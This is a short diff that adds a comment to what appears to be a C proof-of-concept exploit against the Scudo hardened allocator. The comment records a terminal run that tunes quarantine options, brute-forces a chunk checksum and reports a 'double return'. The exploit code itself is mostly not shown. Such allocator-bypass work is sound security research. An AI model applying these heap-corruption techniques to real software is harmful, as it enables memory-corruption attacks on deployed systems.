@@ -101,3 +101,11 @@ int main(){
 		free(malloc(0x123)); // Slowly repopulate Quarantine
 	}
 }
+
+/***
+oof@220:~/scudo$ SCUDO_OPTIONS="thread_local_quarantine_size_kb=64:quarantine_size_kb=256:quarantine_max_chunk_size=2048"
+oof@220:~/scudo$ ./poc
+[!] Bruteforcing to find the correct checksum and fix it
+[+] Achieved double return ;)
+oof@220:~/scudo$
+***/
